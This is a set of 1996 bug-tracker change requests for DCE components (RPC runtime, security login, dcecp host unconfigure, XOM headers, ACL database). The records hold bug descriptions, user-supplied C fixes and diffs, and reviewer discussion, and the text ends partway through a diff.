[10/10/96 public]

Fixed in 1.1 maintenance.



CR Number                     : 13603
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : Trap in rpc__cn_call_executor
Reported Date                 : 8/19/96
Found in Baseline             : 1.1
Found Date                    : 8/19/96
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 1.1maint
Affected File(s)              : cncthd.c cnsclsm.c
Diff supplied by              : user
Diff release                  : 1.1
Sensitivity                   : public

[8/19/96 public]
A trap in rpc__cn_call_executor occur in the dramatic test.  A timing
window during an orphan call occurs if the call rep is not in queue
state.  'stop_orphan_action_rtn' pop's the association off the call rep
(NULLing out the call_r->assoc) while the executor thread is about to 
call the stub routine.  The fourth parameter passes the assoc->ndr_format
which at the time of the trap is NULLed out.  A change in stop_orphan_action_rtn
is needed not to pop the association.  
================================================================================
The fix to rpc__cn_call_executor (cncthd.c) is as following:

add the local varaible ndr_format:
#if defined(AIX_PROD) || defined(IBMOS2)  /* CMVC 22891 */
    ndr_format_t                ndr_format;
#endif

After the following existing statements:
    /*
     * Mark the call as having executed.
     */
    call_r->call_executed = true;

    /*
     * Enable posting of cancels to this call executor thread.
     * This will also post any queued cancels.
     */
    RPC_DBG_PRINTF (rpc_e_dbg_cancel, RPC_C_CN_DBG_CANCEL,
                   ("(rpc__cn_call_executor) call_rep->%x enabling posting of cancels and posting any queued cancels\n", call_r));
    RPC_CALL_LOCK ((rpc_call_rep_t *) call_r);
Add the follwing new checkings:
#if defined(AIX_PROD) || defined(IBMOS2)  /* CMVC 22891 */
    if (call_r->assoc == NULL)
    {
        /*
         * The receiver thread rip the assoc underneath us.
         * This call could be have been orphaned.
         */
         rpc__cthread_cancel_caf ((rpc_call_rep_t *) call_r);
         RPC_CALL_UNLOCK ((rpc_call_rep_t *) call_r);
         goto CLEANUP;
    }
    else
    {
        /*
         * This call could still be orphaned, therefore, lets
         * copy the NDR format from the assoc into a local variable.
         */
        ndr_format.int_rep=(RPC_CN_ASSOC_NDR_FORMAT (call_r->assoc)).int_rep;
        ndr_format.char_rep=(RPC_CN_ASSOC_NDR_FORMAT (call_r->assoc)).char_rep;
        ndr_format.float_rep=(RPC_CN_ASSOC_NDR_FORMAT (call_r->assoc)).float_rep;
        ndr_format.reserved=(RPC_CN_ASSOC_NDR_FORMAT (call_r->assoc)).reserved;
    }
#endif
Changing the following existing statments:
        ((*server_stub_epv[call_r->opnum]))
        ((handle_t) call_r->binding_rep,
         (rpc_call_handle_t) call_r,
         &iovector.elt[0],
         &(RPC_CN_ASSOC_NDR_FORMAT (call_r->assoc)),
         &call_r->transfer_syntax,
         manager_epv,
         &status);
To the following fixes statements:
        ((*server_stub_epv[call_r->opnum]))
        ((handle_t) call_r->binding_rep,
         (rpc_call_handle_t) call_r,
         &iovector.elt[0],
         &ndr_format,
         &call_r->transfer_syntax,
         manager_epv,
         &status);

Add the following changes in stop_orphan_action_rtn (cnsclsm.c):
Before the following existing statement:     
        rpc__cn_assoc_pop_call (call_rep->assoc, call_rep);
Add the following:        RPC_CALL_LOCK (((rpc_call_rep_t *) call_rep));
After the following existing statement:     
        rpc__cn_assoc_pop_call (call_rep->assoc, call_rep);
Add the following:        RPC_CALL_UNLOCK (((rpc_call_rep_t *) call_rep));

[10/10/96 public]

Fixed in 1.1 maintenance.



CR Number                     : 13602
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : coding error in cs_s_reg.c, rpc__codesets_really_read_file()
Reported Date                 : 8/19/96
Found in Baseline             : 1.1
Found Date                    : 8/19/96
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
reported by                   : cwang

[8/19/96 public]

This problem was reported by IBM dcemvs (defect 1199), aixdce's corresponding
defect is 21527.

 in module cs_s_reg.c in function rpc__codesets_really_read_file,                                                                   
 when reading the codeset dffective count, the sizeof variable                                                                      
 uses the size of rpc_g_codesets_entry_count instead of                                                                             
 rpc_g_codesets_effective_count.  Since both are defined as                                                                         
 int, this doesn't affect the code processing.  But for cleaness,                                                                   
 this should be fixed.                                                          

Following is the diff of cs_s_reg.c:

319c319
<       if ((read (CsrFile, (char *)(&rpc_g_codesets_effective_count), sizeof(rpc_g_codesets_effective_count))) == -1)
---
>       if ((read (CsrFile, (char *)(&rpc_g_codesets_effective_count), sizeof(rpc_g_codesets_entry_count))) == -1)



CR Number                     : 13601
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : memory leak in rpc_ns_binding_export
Reported Date                 : 8/19/96
Found in Baseline             : 1.1
Found Date                    : 8/19/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 1.1maint
Affected File(s)              : nsbndexp.c
Diff supplied by              : user
Diff release                  : 1.1
Sensitivity                   : public

[8/19/96 public]
In rpc_ns_binding_export, line 525 (?) of nsbndexp.c calls rpc__ns_uuid_from_uuid
to generate uuid_p, which is then passed to rpc__nsuuid_mbr_add.  If that fails
the code does not a goto CLEANUP, without calling rpc__nsuuid_free.  It should
call rpc__nsuuid_free before checking the status from rpc__nsuuid_mbr_add.
============================================================================
add the following after rpc__nsuuid_mbr_add in rpc_ns_binding_export:
if (*status != rpc_s_ok) {
    unsigned21 temp_status;
    rpc__nsuuid_free (&nsuuid_p, &temp_slatus);
    goto CLEANUP;
}

[10/11/96 public]

unsigned21? I think this is a typo. Fixed in 1.1 maintenance.



CR Number                     : 13600
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : callers of rpc_ss_get_support_ptrs need to check for NULL
Reported Date                 : 8/19/96
Found in Baseline             : 1.1
Found Date                    : 8/19/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 1.1maint
Affected File(s)              : nidlalfr.c
Diff supplied by              : user
Diff release                  : 1.1
Sensitivity                   : public

[8/19/96 public]
Anyone that calls rpc_ss_get_support_ptrs needs to check for a returned
null pointer before they go off trying to lock the associated mutex.
In rpc_ss_allocate there's actually code to check this, 
In addtion, rpc_ss_free should also do the same check.  This caused
a codre dump.
=================================================================== 
The fixes in rpc_ss_allocate (nidlalfr.c):
add the following after rpc_ss_get_support_ptrs( &p_support_ptrs );
if (p_support_ptrs == NULL)
    return(NULL);

The fixes in rpc_ss_free (nidlalfr.c) (nidlalfr.c):
add the following after rpc_ss_get_support_ptrs( &p_support_ptrs ); 
if (p_support_ptrs == NULL)
    return(NULL);

[10/14/96 public]

Fixed in 1.1 maintenance.



CR Number                     : 13599
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : RPC_MEM_ALLOC fail when looking at acl via softlink
Reported Date                 : 8/16/96
Found in Baseline             : 1.1
Found Date                    : 8/16/96
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 1.1maint
Affected File(s)              : rpc/runtime/nsentry.c
Diff supplied by              : user
Diff release                  : 1.1
Sensitivity                   : public

[8/16/96 public]
"/.:/s1" is a CDS softlink to "/.:/subsys/realms/JACOBDOM/servers/JACOB"
when I execute:
dcecp -c acl show /.:/s1/f:/to/to.acl
I get the following error:
...FATAL roc mem D:\U\BUILD\BUILD\SRC\RPC\RUNTIME\RPCMEM.C 619 0xffb27b8 msg#=0x16c9a167 (RPC_MEM_ALLOC) memory allocation failed.

-------------------------------------------------------------------------------
I would like to put the fixed function rpc_ns_entry_inq_resolution as following:

PUBLIC void rpc_ns_entry_inq_resolution
#ifdef _DCE_PROTO_
(
    unsigned32          entry_name_syntax,
    unsigned_char_p_t   entry_name,
    unsigned_char_p_t   *resolved_name,
    unsigned_char_p_t   *unresolved_name,
    unsigned32          *status
)
#else
(entry_name_syntax, entry_name, resolved_name, unresolved_name, status)
unsigned32          entry_name_syntax;
unsigned_char_p_t   entry_name;
unsigned_char_p_t   *resolved_name;
unsigned_char_p_t   *unresolved_name;
unsigned32          *status;
#endif
{
    rpc_nsentry_p_t nsentry;
    unsigned_char_t partial_results [RPC_C_ENTRY_NAME_MAX];
    unsigned32      new_entry_name_syntax,
                    partial_results_length,
                    residual_length,
                    rtn_status;
#if defined(AIX_PROD) || defined(IBMOS2)   /* CMVC 18535 */
    unsigned_char_p_t nsentry_name_p;
    unsigned_char_p_t prev_sep_p;
#endif
    CODING_ERROR (status);
    RPC_NS_VERIFY_INIT ();


    /*
     * Set output values to NULL in case of failure.
     */

    if (resolved_name != NULL)
    {
        *resolved_name = NULL;
    }

    if (unresolved_name != NULL)
    {
        *unresolved_name = NULL;
    }

    /*
     * Resolve name syntax
     */
    new_entry_name_syntax = entry_name_syntax;
    RPC_RESOLVE_SYNTAX (new_entry_name_syntax, status);
    if (*status != rpc_s_ok)
    {
        return;
    }

    /*
     * Convert entry name to a name service representation.
     * This puts it in its expanded form.
     */
    nsentry = rpc__nsentry_from_entry
        (new_entry_name_syntax, entry_name, status);

    if (*status != rpc_s_ok)
    {
        return;
    }

    /*
     * Call rpc__nsattr_read_resolution to see if the name
     * resolves by reading our group attribute.
     */
    rpc__nsattr_read_resolution (nsentry, RPC_C_ATTR_GROUP,
        partial_results, &partial_results_length, &rtn_status);

    if (rtn_status == rpc_s_entry_not_found)
    {
        rtn_status = rpc_s_partial_results;
    }

    if ((rtn_status == rpc_s_ok) ||
        (rtn_status == rpc_s_partial_results))
    {
        /*
         * Heap allocation storage for the resolved portion of the name
         * and copy the results only if the user wants it.
         */
        if (resolved_name != NULL)
        {
            RPC_MEM_ALLOC (
                *resolved_name,
                unsigned_char_p_t,
                partial_results_length+1,
                RPC_C_MEM_STRING,           /* CMVC 14960 */
                RPC_C_MEM_WAITOK);

            strcpy ((char *) *resolved_name, (char *)partial_results);
        }
#if defined(AIX_PROD) || defined(IBMOS2)   /* CMVC 18535 */
        if ((rtn_status == rpc_s_partial_results) &&
           ((signed32)partial_results_length > strlen ((char *)nsentry->name)))
 /* softlink entry name */
        {

            /* resolving non-junction portion of softlink entryname */

            nsentry_name_p = nsentry->name;
            prev_sep_p = NULL;
            while((rtn_status != rpc_s_ok) && nsentry_name_p)
            {
               nsentry_name_p = (unsigned_char_p_t)strrchr( (char *)nsentry->name, '/'); /* CMVC 21932 */
               memset((char *) nsentry_name_p, 0, 1); /* temp terminate */
               if (prev_sep_p != NULL)
                   memset((char *) prev_sep_p, '/', 1); /* restore previous separator */
               nsentry->name_length = (unsigned32)strlen((const char *)(nsentry->name)) + 1;

               /*
                * Call rpc__nsattr_read_resolution to see if the name
                * resolves by reading our group attribute.
                */
               rpc__nsattr_read_resolution ((rpc_nsentry_p_t)nsentry, RPC_C_ATTR_GROUP,
                   partial_results, &partial_results_length, &rtn_status);

               prev_sep_p = nsentry_name_p;  /* save the previous separator */
            }
            rtn_status = rpc_s_partial_results; /* restored    CMVC 22040 */
            memset((char *) prev_sep_p, '/', 1); /* restore previous separator */
            nsentry->name_length = (unsigned32)strlen((const char *)(nsentry->name)) + 1; /* restore */
            residual_length = strlen ((char *) (prev_sep_p + 1));      /* CMVC 21932 */
            /*
             * Heap allocate storage and copy that portion of the name
             * which could not be resolved only if user wants it.
             */
            if (unresolved_name != NULL)
            {
                RPC_MEM_ALLOC (
                    *unresolved_name,
                    unsigned_char_p_t,
                    residual_length+1,
                    RPC_C_MEM_STRING,
                    RPC_C_MEM_WAITOK);

                strcpy ((char *) *unresolved_name,
                        (char *) prev_sep_p + 1);
            }
        }
        else
        {                                                              /* CMVC 21932 */
#endif        /* CMVC 18535 */

        /*
         * Now extract the portion of the entry name that was not resolved.
         */
        residual_length =
            strlen ((char *)nsentry->name) - partial_results_length;

        /*
         * If there is a residual, skip over the separator so we
         * return a relative name.
         */
        if (residual_length > 0)
        {
            residual_length--;
            partial_results_length++;
        }

        /*
         * Heap allocate storage and copy that portion of the name
         * which could not be resolved only if user wants it.
         */
        if (unresolved_name != NULL)
        {
            RPC_MEM_ALLOC (
                *unresolved_name,
                unsigned_char_p_t,
                residual_length+1,
                RPC_C_MEM_STRING,        /*   CMVC 14960 */
                RPC_C_MEM_WAITOK);

            strcpy ((char *) *unresolved_name,
                    (char *) nsentry->name + partial_results_length);
        }
#if defined(AIX_PROD) || defined(IBMOS2)   /* CMVC 21932 */
        }
#endif      /* CMVC 21932 */
    }

    /*
     * Free the name-service entry representation.
     */
    rpc__nsentry_free (&nsentry, status);

    /*
     * Return the results from the read_resolution operation unless
     * nsentry_free failed.
     */
    if (*status == rpc_s_ok)
    {
        *status = rtn_status;
    }

    return;
}

[10/14/96 public]

Fixed in 1.1 maintenance.



CR Number                     : 13598
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : Undefined structure in external header files (Borland)
Reported Date                 : 8/16/96
Found in Baseline             : 1.1
Found Date                    : 8/16/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : rpc/sys_idl/idl_es.h
Diff supplied by              : user
Diff release                  : 1.1
Sensitivity                   : public

[8/16/96 public]
make the following change in idl_es.h
 *
 * "idl_es_handle_t was defined as a pointer to "struct idl_es_handle_s_t"
 * which is defined in /export/power/usr/include/dce/ideddefs.h .
 * "idlddefs.h" includes "idl_es.h" but not vice versa -- a bizzard style.
 * So when an application includes "idl_es.h" but not "idlddefs.h", the
 * compiler will generate a undefined structure message.
 *
 * IDLDDEFS_H is defined in "idlddefs.h", so if an application includes this
 * file, it can still access the structure "idl_es_handle_t".
 * But if an application includes "idl_es.h" only, "idl_es_handle_t" just looks
 * like an opaque pointer to it.
 *
 */

#if defined(AIX_PROD) || defined(IBMOS2)   /* CMVC 19644 */ 
#ifdef IDLDDEFS_H
#endif   /* CMVC 19644 */

typedef struct idl_es_handle_s_t *idl_es_handle_t;
#if defined(AIX_PROD) || defined(IBMOS2)   /* CMVC 19644 */


#else
typedef void *idl_es_handle_t;
#endif
#endif   /* CMVC 19644 */

[08/16/96 public]
This sounds like a work-around for a Borland C compiler bug.
Things like
	typedef struct foo *foo_handle;
are common, and legal, in C.  Is the Borland compiler complaining about
this?  IT shouldn't.

The "bizzard" [sic] style is a good way to write code:  the internal,
implementation, header file, includes the external, public, interfaces.

Unless I'm misunderstanding, this defect should be cancelled.

---------------------------------------------------------------------------
Since an application included <idl_es.h>, which did not have struct
definition of idl_es_handle_s_t, the compiler normally will
complain if it had the variable referring to this struct,
like "typedef struct idl_es_handle_s_t *idl_es_handle_t;".
Now idlddefs.h included idl_es.h and also had a struct idl_es_handle_s_t
defined.  Therefore, if an applicaion wants to refer to this structure
it should either include idlddefs.h or like the fix described.


I would like to hear more comments from you.  Thanks!

[08/20/96 public]
Sorry, but you're wrong.
>Since an application included <idl_es.h>, which did not have struct
>definition of idl_es_handle_s_t, the compiler normally will
>complain if it had the variable referring to this struct,
>like "typedef struct idl_es_handle_s_t *idl_es_handle_t;".

If your compiler is doing this, then your compiler has a bug.  Or at
least it is an annoying feature that should be turned off.  Pointers to
incomplete types are legal C, and useful for "data hiding."

The DCE code is correct.  This defect should be cancelled.



CR Number                     : 13597
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : ptrs are not freed when per-thread context destroyed
Reported Date                 : 8/16/96
Found in Baseline             : 1.1
Found Date                    : 8/16/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 1.1maint
Affected File(s)              : alfrsupp.c eenodtbl.c
Diff supplied by              : user
Diff release                  : 1.1
Sensitivity                   : public

[8/16/96 public]
make the following change in rpc_ss_set_thread_handl in alfrsupp.c:
 
    if ( helper_thread_indirection_ptr != NULL )
    {
#if defined(AIX_PROD) || defined(IBMOS2)   /* CMVC 15190 */

        if (helper_thread_indirection_ptr->free_referents)
        {
            rpc_ss_thread_support_ptrs_t *p_thread_support_ptrs;

            p_thread_support_ptrs = helper_thread_indirection_ptr->indirection;

            /* Release any memory owned by the memory handle */
            rpc_ss_mem_free( p_thread_support_ptrs->p_mem_h );

            /*
             *  Free the objects it points at.
             *  Must cast because instance_of
             *  (rpc_ss_thread_support_ptrs_t).p_mem_h
             *  is of type rpc_mem_handle, which is a pointer to volatile,
             *  and free() doesn't take a pointer to volatile.
             */
            free( (idl_void_p_t)p_thread_support_ptrs->p_mem_h );
            RPC_SS_THREADS_MUTEX_DELETE( &(p_thread_support_ptrs->mutex) );

            /* Free the structure */
            free( p_thread_support_ptrs );
        }
endif  /* CMVC 15190 */


        free( helper_thread_indirection_ptr );
    }

==========================================================================
make the following change in rpc_ss_build_indirection_struct in eenodtbl.c
    if ( helper_thread_indirection_ptr != NULL )
    {
#if defined(AIX_PROD) || defined(IBMOS2)   /* CMVC 15190 */
        if (helper_thread_indirection_ptr->free_referents)
        {
            rpc_ss_thread_support_ptrs_t *old_thread_support_ptrs;

            old_thread_support_ptrs = helper_thread_indirection_ptr->indirectio;

            /* Release any memory owned by the memory handle */
            rpc_ss_mem_free( old_thread_support_ptrs->p_mem_h );

            /*
             *  Free the objects it points at.
             *  Must cast because instance_of
             *  (rpc_ss_thread_support_ptrs_t).p_mem_h
             *  is of type rpc_mem_handle, which is a pointer to volatile,
             *  and free() doesn't take a pointer to volatile.
             */
            free( (idl_void_p_t)old_thread_support_ptrs->p_mem_h );
            RPC_SS_THREADS_MUTEX_DELETE( &(old_thread_support_ptrs->mutex) );

            /* Free the structure */
            free( old_thread_support_ptrs );
        }
#endif   /* CMVC 15190 */

        free( helper_thread_indirection_ptr );
    }

[10/14/96 public]

Fixed in 1.1 maintenance.



CR Number                     : 13596
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : login
Short Description             : Cannot dce_login with keys with a zero length salt (pepper)
Reported Date                 : 8/16/96
Found in Baseline             : 1.1
Found Date                    : 8/16/96
Severity                      : C
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : security/client/login/sec_login_pvt.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[8/16/96 public]

Principals with keys that have a zero length pepper cannot validate
their DCE identity. This is a defect. The bug is in the preauthentication
retry code in sec_login_pvt.c. The initial preauth request uses the
default pepper and if that fails, the security server returns the
correct pepper for that account. The preauth code then retries the
request with the correct pepper. However, the following code in
sec_login_pvt.c is in error:

if (memcmp(key->pepper, dce_err_data->contents,
      dce_err_data->length) != 0) {

Since the length will be zero, the memcmp will always return 0, and
the code to try another salt will never be executed.

Principals from a Kerberos 4 database can migrate to DCE without
changing their passwords if you specify a zero length pepper. This
bug currently prevents that.



CR Number                     : 13587
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : need rdacl v0.0 for unauth client
Reported Date                 : 8/5/96
Found in Baseline             : 1.1
Found Date                    : 8/5/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[8/5/96 public]

If a 1.1 server that exports rdacl v1.0 to the endpoint mapper only,
that is, rdacl 1.0 and not rdacl 0.0, then an unauthenticated client
(in this case, dcecp but this also applies to acl_edit) gets the
"Unknown interface" error when you try to view the server's acls,
even though the acls on the namespace entry grant access to the client.
Adding support for the rdacl 0.0 interface in the server makes this
problem go away.  Although the 1.1 endpoint mapper protects its 
entries more carefully than the previous endpoint mapper, it doesn't
seem to make sense that access from an unauthenticated client should
vary so much between the two rdacl interfaces, unless there's an endpoint
mapper acl for the rdacl 1.0 i/f that I'm forgetting to set somewhere.

[8/8/96 public]

On the advise of Mike Burati, changing the component
from 'dcecp' to 'sec'.



CR Number                     : 13579
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : idl marshalling/unmarshalling
Short Description             : varying arrays limited to a double
byte size (65536). AES states 4 byte size. This discrepancy cause illegal state
Reported Date                 : 7/26/96
Found in Baseline             : 1.1
Found Date                    : 7/26/96
Severity                      : A
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[7/26/96 public]

An illegal state occurs when using tcp in the perf multi-threaded
test with a 1meg data (actually it occurs in sizes > 65536*4).   
The receiver thread keeps the call_rep state
in a "request" state until the last fragment is sent.  The unmarhaller
then reads the buffers according to the size of the array set by the client.
In the perf testcase, however, the server unmarshaller
calculates the byte_size incorrectly since the number of elements
sent by the client is limited to a unsigned short. Therefore the server
reads very little of the data before proceeding into the manager,
marshaller and transmit phases.  The transmit phase is the cn call state
killer since the receiver thread has not received the last fragment,therefore,
the state of the call_rep is "request". Once the transmit phase invokes a
"response" event an illegal state occurs as show below:

1996-05-20-22:18:05.070-05:00I----- PID#87 FATAL rpc cn_state D:\U\BUILD\BUILD
RC\RPC\RUNTIME\CNSCLSM.C 3097 0x012605a8 msgID=0x16C9A148
Illegal state transition detected in CN server call state machine [cur_state:
5, cur_event: 101, call_rep: 11b3c10]


To reproduce the problem, use the perf testcase with the following commands:

Server:

server 1 ncacn_ip_tcp

Client:

client -m1 1 ncacn_ip_tcp:hostname[2001] 1 1 n n 1000000 



To fix this problem I changed the marshaller and unmarshaller runtime
code to use unsigned long instead of unsigned short. The problem with
this fix is that both the client and server need the changes even if the
size of the varying array is actually within 65536. In other
words, suppose the client does not have the change. The client will therefore
marshall and send the size in a double byte format. The server with the
fix will then read and unmarshall 4bytes. Two of these bytes will be incorrect
,thereby, corrupting the size intended by the client.



CR Number                     : 13558
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : gds
Subcomponent Name             : xom
Short Description             : xomi.h not C++-friendly
Reported Date                 : 7/2/96
Found in Baseline             : 1.2.2b1,1.1,1.2.1
Found Date                    : 7/2/96
Severity                      : B
Priority                      : 0
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : directory/xom/h/xomi.h
Diff supplied by              : user
Diff release                  : 1.2.2b1
Sensitivity                   : public

[7/2/96 public]

The header file xomi.h includes function prototypes with formal
parameters called "class".  Since "class" is a C++ reserved-word,
a C++ compiler will barf on these declarations.  Changing the
formal parameter names to "theClass" fixes this problem.

Digital's R1.2.2 public-key work needs this file to be
suitable for C++ use, so we will submit this change with our first
PK drop.

124c124
<       OM_object_identifier    theClass,
---
>       OM_object_identifier    class,
163c163
<       OM_object_identifier    theClass,
---
>       OM_object_identifier    class,



CR Number                     : 13554
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dcecp
Subcomponent Name             : host
Short Description             : 'host unconfigure' can remove extra principals
Reported Date                 : 6/27/96
Found in Baseline             : 1.1, 1.2
Found Date                    : 6/27/96
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2.2
Fixed In Baseline             : 
Affected File(s)              : scripts/host.dcp
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[6/27/96 public]

A support customer reported the following:
-----------------------------------------

> In DCE 1.1, the "dcecp host unconfigure" command has a bug that will remove
> principals for all hosts with names that start with a substring that is the 
> same as the host name that you want to unconfigure. For example if you have
> several hosts named
> 
>     hosts/dce
>     hosts/dce1
>     hosts/dce2
> 
> then unconfiguring hosts/dce will remove the principals for hosts/dce1 and 
> hosts/dce2 as well. If these machines are your servers, then you will be in
> big truble. I have seen this problem in DCE 2.1 for AIX and DCE 1.1 for
> Solaris from Transarc.
> 
> The bug is in the /opt/dcelocal/dcecp/host.dcp script in function 
> _dcp_host_unconfigure. It loops over all principals and removes any that
> start with the host_name substring. What is should realy do is simply add 
> "/self" to the host_name to get the principal name.
> 
> This is provided as an advisory to keep you from shooting yourselves in
> the foot.  
>

[6/28/96 public]

   The funniest thing about this bug is that this exact behavior is specified
   in the manpage.  In the 'unconfig' section of the dcecp_host manpage:

        To unconfigure a cell, the operation deletes:
                   :
                   :
           * All principal names beginning with hosts/hostname, but not
             accounts with the same names.

   So the user is being told exactly what's going to happen during the
   'unconfigure'.  At least this is a very well documented bug.  Sigh.
   (Of course, when the principal is deleted, the account goes with it,
   so the second part of the above note is misleading, at the least).

   So when host.dcp is fixed, the manpage should be fixed as well.

[6/28/96 public]
Not exactly. The behavior is designed to do 'rm host/<hostname>/*'. The
current behavior is (I believe) 'rm host/<hostname>*/*'. That's the bug.
The documentation should be fixed to remove the silliness about not
removing accounts.

[6/28/96 public]

   The manpage says all principals beginning with hosts/hostname are
   deleted, and that's exactly what happens.  It doesn't matter where
   the '/' comes after 'hostname'.  As John says, the code should do:

      rm hosts/<hostname>/*

   but what it does is

      rm hosts/<hostname>*

   So just appending 'self' isn't quite enough, since there often exists
   principals such as hosts/<hostname>/dfs-server that should also be
   deleted.



CR Number                     : 13552
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : utils
Subcomponent Name             : acldb
Short Description             : incorrect parameter in call to dce_db_fetch
Reported Date                 : 6/26/96
Found in Baseline             : 1.1
Found Date                    : 6/26/96
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : dce/utils/acldb/aclimpl.c
Diff supplied by              : user
Diff release                  : 1.1
Sensitivity                   : public

[6/26/96 public]
dce_acl_resolve_by_name passes in &component_name (a char **) when
dce_db_fetch expects a char *.  It should just pass component_name.

*** aclimpl.c~	Wed Jun 26 15:53:18 1996
--- aclimpl.c	Wed Jun 26 15:54:23 1996
***************
*** 764,770 ****
       */
      db_h = (dce_db_handle_t)resolver_arg;
  /*    dce_db_fetch_header(db_h, &component_name, &dbh, st);*/
!     dce_db_fetch(db_h, &component_name, &dbh, st);
      STAT_CHECK_RET(*st);
  
      /* Get the appropriate ACL based on the ACL type. */
--- 764,770 ----
       */
      db_h = (dce_db_handle_t)resolver_arg;
  /*    dce_db_fetch_header(db_h, &component_name, &dbh, st);*/
!     dce_db_fetch(db_h, component_name, &dbh, st);
      STAT_CHECK_RET(*st);
  
      /* Get the appropriate ACL based on the ACL type. */



CR Number                     : 13534
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : misc unitialized memory references leaks in rpc runtime
Reported Date                 : 6/20/96
Found in Baseline             : 1.1
Found Date                    : 6/20/96
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : nsbndexp.c nslookup.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[6/20/96 public]

There were some small leaks/ uninitialized memory accesses in the rpc runtime.

rpc_ns_binding_export was leaking memory
Here's a delta that fixes the leak:

Change: rpc/runtime/nsbndexp.c from 12.2 to 12.5
*** rpc/runtime/nsbndexp.c
***************
*** 232,237 ****
--- 241,247 ----
      RPC_NS_VERIFY_INIT ();
  
      binding_vec_copy = NULL;
+     nsentry = NULL;
  
***************
*** 303,315 ****
      RPC_RESOLVE_SYNTAX (name_syntax, status);
      if (*status != rpc_s_ok)
      {
!         return;
      }
  
      nsentry = rpc__nsentry_from_entry (name_syntax, entry_name, status);
      if (*status != rpc_s_ok)
      {
!         return;
      }
  
      /*
--- 312,324 ----
      RPC_RESOLVE_SYNTAX (name_syntax, status);
      if (*status != rpc_s_ok)
      {
!         goto CLEANUP;
      }
  
      nsentry = rpc__nsentry_from_entry (name_syntax, entry_name, status);
      if (*status != rpc_s_ok)
      {
!         goto CLEANUP;
      }
  
      /*
***************
*** 320,326 ****
          (*status != rpc_s_entry_already_exists))
      {
